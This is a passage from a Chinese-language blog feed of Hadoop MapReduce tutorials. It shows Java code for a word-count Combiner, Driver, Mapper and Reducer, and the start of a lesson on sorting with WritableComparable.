class="line">![](./Mapreduce-Combiner合并/image-20221218183845643.png)</span><br><span class="line"></span><br><span class="line">## 3.3 代码实现（方案一）</span><br><span class="line"></span><br><span class="line">### （1）增加一个 WordCountCombiner 类继承 Reducer</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line">package cn.aiyingke.mapreduce.combiner;</span><br><span class="line"></span><br><span class="line">import org.apache.hadoop.io.IntWritable;</span><br><span class="line">import org.apache.hadoop.io.Text;</span><br><span class="line">import org.apache.hadoop.mapreduce.Reducer;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Author: Rupert Tears</span><br><span class="line"> * Date: Created in 19:18 2022/12/18</span><br><span class="line"> * Description: Thought is already is late, exactly is the earliest time.</span><br><span class="line"> */</span><br><span class="line">public class WordCountCombiner extends Reducer&lt;Text, IntWritable, Text, IntWritable&gt; &#123;</span><br><span class="line"></span><br><span class="line">    private final IntWritable outV = new IntWritable();</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected void reduce(Text key, Iterable&lt;IntWritable&gt; values, Reducer&lt;Text, IntWritable, Text, IntWritable&gt;.Context context) throws IOException, InterruptedException &#123;</span><br><span class="line"></span><br><span class="line">        // 定义聚合变量</span><br><span class="line">        int sum = 0;</span><br><span class="line"></span><br><span class="line">        // 遍历求和</span><br><span class="line">        for (IntWritable value : values) &#123;</span><br><span class="line">            sum += value.get();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 封装 outKV</span><br><span class="line">        outV.set(sum);</span><br><span class="line"></span><br><span class="line">        // 写出</span><br><span class="line">        context.write(key, outV);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（2）在-WordcountDriver-驱动类中指定-Combiner"><a href="#（2）在-WordcountDriver-驱动类中指定-Combiner" class="headerlink" title="（2）在 WordcountDriver 驱动类中指定 Combiner"></a>（2）在 WordcountDriver 驱动类中指定 Combiner</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置自定义的 Combiner</span></span><br><span class="line">job.setCombinerClass(WordCountCombiner.class);</span><br></pre></td></tr></table></figure><h2 id="3-4-代码实现（方案二）"><a href="#3-4-代码实现（方案二）" class="headerlink" title="3.4 代码实现（方案二）"></a>3.4 代码实现（方案二）</h2><h3 id="（1）将-WordcountReducer-作为-Combiner-在-WordcountDriver-驱动类中指定"><a href="#（1）将-WordcountReducer-作为-Combiner-在-WordcountDriver-驱动类中指定" class="headerlink" title="（1）将 WordcountReducer 作为 Combiner 在 WordcountDriver 驱动类中指定"></a>（1）将 WordcountReducer 作为 Combiner 在 WordcountDriver 驱动类中指定</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">job.setCombinerClass(WordCountReducer.class);</span><br></pre></td></tr></table></figure><h2 id="3-5-代码汇总"><a href="#3-5-代码汇总" class="headerlink" title="3.5 代码汇总"></a>3.5 代码汇总</h2><h3 id="（1）驱动器类"><a href="#（1）驱动器类" class="headerlink" title="（1）驱动器类"></a>（1）驱动器类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.combiner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.Path;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.IntWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Job;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.input.CombineTextInputFormat;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.input.FileInputFormat;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 23:40 2022/12/16</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WordCountDriver</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, InterruptedException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *       1.拿到配置环境变量</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">Configuration</span> <span class="variable">configuration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Configuration</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *       2.拿到job作业对象</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">Job</span> <span class="variable">job</span> <span class="operator">=</span> Job.getInstance(configuration, <span class="string">&quot;WordCount-MR&quot;</span>);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *       3.设置主类，（即：告知集群入口jar包在哪）</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        job.setJarByClass(WordCountDriver.class);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *      4.设置 mapper combiner reducer</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        job.setMapperClass(WordCountMapper.class);</span><br><span class="line">        <span class="comment">// 设置自定义的 Combiner</span></span><br><span class="line">        job.setCombinerClass(WordCountCombiner.class);</span><br><span class="line"><span class="comment">//        job.setCombinerClass(WordCountReducer.class);</span></span><br><span class="line">        job.setReducerClass(WordCountReducer.class);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *       5.设置输出 key value的类型</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        job.setOutputKeyClass(Text.class);</span><br><span class="line">        job.setOutputValueClass(IntWritable.class);</span><br><span class="line"></span><br><span class="line">        job.setInputFormatClass(CombineTextInputFormat.class);</span><br><span class="line">        CombineTextInputFormat.setMaxInputSplitSize(job, <span class="number">4194304</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *       6.设置输入、输出的数据路径</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        FileInputFormat.addInputPath(job, <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;Y:\\Temp\\data.txt&quot;</span>));</span><br><span class="line">        FileOutputFormat.setOutputPath(job, <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;Y:\\Temp\\asdsad&quot;</span>));</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *       7.提交执行</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        System.exit(job.waitForCompletion(<span class="literal">true</span>) ? <span class="number">0</span> : <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（2）Mapper-类"><a href="#（2）Mapper-类" class="headerlink" title="（2）Mapper 类"></a>（2）Mapper 类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.combiner;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.IntWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.StringTokenizer;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 23:40 2022/12/16</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WordCountMapper</span> <span class="keyword">extends</span> <span class="title class_">Mapper</span>&lt;Object, Text, Text, IntWritable&gt; &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 暂存一个常用的IntWritable对象，对 java 整形的封装</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">IntWritable</span> <span class="variable">intWritable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntWritable</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 暂存一个 String 的封装类</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">Text</span> <span class="variable">text</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Text</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 覆写map方法</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> InterruptedException 1.对输入的文件，以行为单位进行切分，按规则切分（空格）；</span></span><br><span class="line"><span class="comment">     *                              2.遍历切分完成后的集合或迭代器</span></span><br><span class="line"><span class="comment">     *                              3.组合&lt;key,value&gt;,通过Context进行输出</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">map</span><span class="params">(Object key, Text value, Mapper&lt;Object, Text, Text, IntWritable&gt;.Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">        <span class="comment">// 将传入的数据转换为字符串 指定分割符号为逗号</span></span><br><span class="line">        <span class="type">StringTokenizer</span> <span class="variable">stringTokenizer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringTokenizer</span>(value.toString(), <span class="string">&quot;,&quot;</span>);</span><br><span class="line">        <span class="comment">// 循环获取每个逗号分割出来的元素</span></span><br><span class="line">        <span class="keyword">while</span> (stringTokenizer.hasMoreTokens()) &#123;</span><br><span class="line">            <span class="comment">// 接收获取元素</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">word</span> <span class="operator">=</span> stringTokenizer.nextToken();</span><br><span class="line">            <span class="comment">// 添加分割后的元素到封装类中</span></span><br><span class="line">            text.set(word);</span><br><span class="line">            <span class="comment">// 上下文调度</span></span><br><span class="line">            context.write(text, intWritable);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（3）Reducer-类"><a href="#（3）Reducer-类" class="headerlink" title="（3）Reducer 类"></a>（3）Reducer 类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.combiner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.IntWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Reducer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 23:41 2022/12/16</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WordCountReducer</span> <span class="keyword">extends</span> <span class="title class_">Reducer</span>&lt;Text, IntWritable, Text, IntWritable&gt; &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 定义一个存储 int类型的求和结果的变量</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">IntWritable</span> <span class="variable">sumIntWritable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntWritable</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 以key相同的组为单位处理，即 Reducer 方法调用一次，处理同 key的组数据</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">reduce</span><span class="params">(Text key, Iterable&lt;IntWritable&gt; values, Reducer&lt;Text, IntWritable, Text, IntWritable&gt;.Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">        <span class="comment">// 定义一个总词频变量</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 循环计数</span></span><br><span class="line">        <span class="keyword">for</span> (IntWritable val : values) &#123;</span><br><span class="line">            count += val.get();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将频数封装</span></span><br><span class="line">        sumIntWritable.set(count);</span><br><span class="line">        <span class="comment">// 上下文调度</span></span><br><span class="line">        context.write(key, sumIntWritable);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（4）Combiner-类"><a href="#（4）Combiner-类" class="headerlink" title="（4）Combiner 类"></a>（4）Combiner 类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.combiner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.IntWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Reducer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 19:18 2022/12/18</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WordCountCombiner</span> <span class="keyword">extends</span> <span class="title class_">Reducer</span>&lt;Text, IntWritable, Text, IntWritable&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">IntWritable</span> <span class="variable">outV</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntWritable</span>();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">reduce</span><span class="params">(Text key, Iterable&lt;IntWritable&gt; values, Reducer&lt;Text, IntWritable, Text, IntWritable&gt;.Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 定义聚合变量</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历求和</span></span><br><span class="line">        <span class="keyword">for</span> (IntWritable value : values) &#123;</span><br><span class="line">            sum += value.get();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 封装 outKV</span></span><br><span class="line">        outV.set(sum);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 写出</span></span><br><span class="line">        context.write(key, outV);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 日志输出</span><br><span class="line">Combine input records=6</span><br><span class="line">Combine output records=3</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Hadoop </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mapreduce WritableComparable排序</title>
      <link href="/blog/59213c23.html/"/>
      <url>/blog/59213c23.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：排序概述"><a href="#一：排序概述" class="headerlink" title="一：排序概述"></a>一：排序概述</h1><ul><li>排序是MapReduce框架中最重要的操作之一。</li><li>MapTask和ReduceTask均会对数据按 照key进行排序。该操作属于 Hadoop的默认行为。<code>任何应用程序中的数据均会被排序，而不管逻辑上是否需要</code>。</li><li>默认排序是按照<code>字典顺序排序</code>，且实现该排序的方法是<code>快速排序</code>。</li><li>对于MapTask，它会将处理的结果暂时放到环形缓冲区中，<code>当环形缓冲区使 用率达到一定阈值后，再对缓冲区中的数据进行一次快速排序</code>，并将这些有序数据溢写到磁盘上，而<code>当数据处理完毕后，它会对磁盘上所有文件进行归并排序</code>。</li><li>对于ReduceTask，它从每个MapTask上远程拷贝相应的数据文件，如果文件大 小超过一定阈值，则溢写磁盘上，否则存储在内存中。如果磁盘上文件数目达到 一定阈值，则进行一次归并排序以生成一个更大文件；如果内存中文件大小或者 数目超过一定阈值，则进行一次合并后将数据溢写到磁盘上。当所有数据拷贝完 毕后，ReduceTask统一对内存和磁盘上的所有数据进行一次归并排序。</li></ul><h1 id="二：排序分类"><a href="#二：排序分类" class="headerlink" title="二：排序分类"></a>二：排序分类</h1><h2 id="（1）部分排序"><a href="#（1）部分排序" class="headerlink" title="（1）部分排序"></a>（1）部分排序</h2><p>MapReduce根据输入记录的键对数据集排序。保证输出的每个文件内部有序。</p><h2 id="（2）全排序"><a href="#（2）全排序" class="headerlink" title="（2）全排序"></a>（2）全排序</h2><p>最终输出结果只有一个文件，且文件内部有序。实现方式是只设置一个ReduceTask。但该方法在 处理大型文件时效率极低，因为一台机器处理所有文件，完全丧失了MapReduce所提供的并行架构。</p><h2 id="（3）辅助排序：（GroupingComparator分组）"><a href="#（3）辅助排序：（GroupingComparator分组）" class="headerlink" title="（3）辅助排序：（GroupingComparator分组）"></a>（3）辅助排序：（GroupingComparator分组）</h2><p>在Reduce端对key进行分组。应用于：在接收的key为bean对象时，想让一个或几个字段相同（全部 字段比较不相同）的key进入到同一个reduce方法时，可以采用分组排序。</p><h2 id="（4）二次排序"><a href="#（4）二次排序" class="headerlink" title="（4）二次排序"></a>（4）二次排序</h2><p>在自定义排序过程中，如果compareTo中的判断条件为两个即为二次排序。</p><h1 id="三：自定义排序-WritableComparable-原理分析"><a href="#三：自定义排序-WritableComparable-原理分析" class="headerlink" title="三：自定义排序 WritableComparable 原理分析"></a>三：自定义排序 WritableComparable 原理分析</h1><p>bean 对象做为 key 传输，需要<code>实现 WritableComparable 接口重写 compareTo 方法</code>，就可 以实现排序。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compareTo</span><span class="params">(FlowBean bean)</span> &#123;</span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line"><span class="comment">// 按照总流量大小，倒序排列</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.sumFlow &gt; bean.getSumFlow()) &#123;</span><br><span class="line">result = -<span class="number">1</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.sumFlow &lt; bean.getSumFlow()) &#123;</span><br><span class="line">result = <span class="number">1</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">result = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="四：WritableComparable-排序案例实操（全排序）"><a href="#四：WritableComparable-排序案例实操（全排序）" class="headerlink" title="四：WritableComparable 排序案例实操（全排序）"></a>四：WritableComparable 排序案例实操（全排序）</h1><h2 id="4-1-需求"><a href="#4-1-需求" class="headerlink" title="4.1 需求"></a>4.1 需求</h2><p>对 phone_data .txt 中的数据，按照总流量进行倒叙排序；</p><h3 id="（1）输入数据"><a href="#（1）输入数据" class="headerlink" title="（1）输入数据"></a>（1）输入数据</h3><ul><li>phone_data .txt</li></ul><h3 id="（2）期望输出数据"><a href="#（2）期望输出数据" class="headerlink" title="（2）期望输出数据"></a>（2）期望输出数据</h3><p><img src="/blog/59213c23.html/image-20221218174341483.png"></p><h2 id="4-2-需求分析"><a href="#4-2-需求分析" class="headerlink" title="4.2 需求分析"></a>4.2 需求分析</h2><p><img src="/blog/59213c23.html/image-20221218174423794.png"></p><h2 id="4-3-代码实现"><a href="#4-3-代码实现" class="headerlink" title="4.3 代码实现"></a>4.3 代码实现</h2><h3 id="（1）FlowBean-对象实现-WritableComparable，增加比较功能"><a href="#（1）FlowBean-对象实现-WritableComparable，增加比较功能" class="headerlink" title="（1）FlowBean 对象实现 WritableComparable，增加比较功能"></a>（1）FlowBean 对象实现 WritableComparable，增加比较功能</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实现WritableComparable接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlowBean</span> <span class="keyword">implements</span> <span class="title class_">WritableComparable</span>&lt;FlowBean&gt; &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 覆写compareTo方法</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compareTo</span><span class="params">(FlowBean o)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 按照总流量比较,倒叙排列</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.sumFlow &gt; o.sumFlow) &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.sumFlow &lt; o.sumFlow) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="（2）实体类"><a href="#（2）实体类" class="headerlink" title="（2）实体类"></a>（2）实体类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.writableComparable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="keyword">import</span> lombok.Setter;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Writable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.WritableComparable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.DataInput;</span><br><span class="line"><span 